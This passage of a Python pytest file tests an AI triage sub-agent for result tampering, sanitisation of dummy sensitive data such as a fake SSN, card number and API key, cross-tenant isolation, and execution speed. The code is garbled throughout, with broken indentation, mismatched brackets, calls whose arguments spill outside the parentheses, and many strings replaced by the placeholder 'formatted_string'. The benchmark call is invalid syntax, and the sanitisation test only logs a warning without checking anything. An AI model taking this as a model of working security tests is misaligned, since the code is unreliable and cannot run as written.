                # (This depends on implementation, but at least verify no degradation)
assert self.stress_metrics.cache_hit_rate >= 0, "Cache hit rate calculation failed"

                # Verify execution times are reasonable
if successful_results:
avg_time = sum(r['execution_time'] for r in successful_results) / len(successful_results)
assert avg_time < 2.0, "formatted_string"


class TestTriageSecurityAndDataProtection(TriageContextMigrationTestSuite):
        """Security-focused tests for triage data protection."""

@pytest.mark.asyncio
    async def test_triage_result_tampering_prevention(self, mock_triage_dependencies, valid_user_context):
"""Test prevention of triage result tampering or manipulation."""
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
        

original_request = "Analyze sensitive financial data"

state = DeepAgentState()
state.user_request = original_request
state.user_id = valid_user_context.user_id

context = ExecutionContext( )
run_id=valid_user_context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
        

        # Execute triage normally
original_result = await triage_agent.execute_core_logic(context)

        # Attempt to tamper with the result
if hasattr(state, 'triage_result') and isinstance(state.triage_result, dict):
            # Try to modify the result
tampering_attempts = [ )
('category', 'admin_override'),
('confidence_score', 1.0),
('user_id', 'malicious_user'),
('access_level', 'elevated')
            

for field, malicious_value in tampering_attempts:
if field in state.triage_result:
original_value = state.triage_result[field]
state.triage_result[field] = malicious_value

                    # Re-execute to see if tampering persists
new_result = await triage_agent.execute_core_logic(context)

                    # Verify tampering was detected or corrected
if hasattr(state, 'triage_result'):
assert state.triage_result[field] != malicious_value or \
state.triage_result[field] == original_value, \
"formatted_string"

@pytest.mark.asyncio
    async def test_sensitive_data_sanitization_in_triage(self, mock_triage_dependencies):
"""Test sanitization of sensitive data in triage processing."""
pass
sensitive_data_patterns = [ )
"SSN: 123-45-6789",
"Credit Card: 4111-1111-1111-1111",
"Email: user@secret.com",
"Phone: +1-555-123-4567",
"API Key: sk_live_123abc456def",
"Password: secretpassword123",
"Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",
"Database URL: postgresql://user:pass@host:5432/db"
                            

for sensitive_pattern in sensitive_data_patterns:
user_id = "formatted_string"
context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string"
                                

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
                                

request_with_sensitive_data = "formatted_string"

state = DeepAgentState()
state.user_request = request_with_sensitive_data
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
                                

                                # Execute triage
result = await triage_agent.execute_core_logic(exec_context)

                                # Verify sensitive data is handled appropriately
result_str = str(result)
triage_result_str = str(getattr(state, 'triage_result', {}))

                                # Check if sensitive data appears in results (it might be OK if properly handled)
if sensitive_pattern in result_str or sensitive_pattern in triage_result_str:
                                    # If sensitive data appears, it should be in a controlled/sanitized form
                                    # This is application-specific - for now, just ensure it's not in plain sight
logging.warning("formatted_string")

                                    # Verify the triage still produced a valid result
assert isinstance(result, dict) or state.triage_result is not None, \
"Triage failed to produce result for request with sensitive data"

@pytest.mark.asyncio
    async def test_cross_tenant_data_isolation_in_triage(self, mock_triage_dependencies):
"""Test that triage maintains strict cross-tenant data isolation."""
                                        # Simulate multi-tenant scenario
tenants = [ )
{"id": "tenant_alpha", "secret": "alpha_secret_data", "category": "financial"},
{"id": "tenant_beta", "secret": "beta_secret_data", "category": "healthcare"},
{"id": "tenant_gamma", "secret": "gamma_secret_data", "category": "retail"}
                                        

tenant_results = {}

for tenant in tenants:
context = UserExecutionContext.from_request( )
user_id="formatted_string",
thread_id="formatted_string",
run_id="formatted_string",
metadata={ )
"tenant_id": tenant["id"],
"tenant_secret": tenant["secret"],
"data_classification": tenant["category"]
                                            
                                            

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
                                            

request = "formatted_string"

state = DeepAgentState()
state.user_request = request
state.user_id = context.user_id
state.tenant_id = tenant["id"]

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
                                            

result = await triage_agent.execute_core_logic(exec_context)

tenant_results[tenant["id"]] = { )
"result": result,
"state": state,
"context": context,
"secret": tenant["secret"]
                                            

                                            # Verify cross-tenant isolation
tenant_ids = list(tenant_results.keys())
for i, tenant1 in enumerate(tenant_ids):
for j, tenant2 in enumerate(tenant_ids):
if i != j:
result1 = tenant_results[tenant1]
result2 = tenant_results[tenant2]

                                                        # Tenant 1's secret should not appear in tenant 2's results
result2_str = str(result2["result"]) + str(getattr(result2["state"], 'triage_result', {}))

assert result1["secret"] not in result2_str, \
"formatted_string"

                                                        # Tenant 1's ID should not appear in tenant 2's context
assert tenant1 not in str(result2["context"].to_dict()), \
"formatted_string"s context"


                                                        # Performance benchmarking for triage operations
@pytest.mark.benchmark
class TestTriagePerformanceBenchmarks(TriageContextMigrationTestSuite):
    """Benchmark tests for triage performance regression detection."""

@pytest.mark.asyncio
    async def test_triage_execution_benchmark(self, benchmark, mock_triage_dependencies):
"""Benchmark triage execution performance."""
context = UserExecutionContext.from_request( )
user_id="benchmark_triage_user",
thread_id="benchmark_triage_thread",
run_id="benchmark_triage_run"
        

async def execute_triage_benchmark():
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
    

state = DeepAgentState()
state.user_request = "Analyze performance data for optimization insights"
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
    

await asyncio.sleep(0)
return await triage_agent.execute_core_logic(exec_context)

result = await execute_triage_benchmark()  # Warm up
benchmark(lambda x: None asyncio.run(execute_triage_benchmark()))


    # Test configuration and runners
if __name__ == "__main__":
pytest.main([ ))
__file__,
"-v",
"--tb=short",
"--asyncio-mode=auto",
"--timeout=300",  # 5 minute timeout per test
"-x"  # Stop on first failure
        
pass
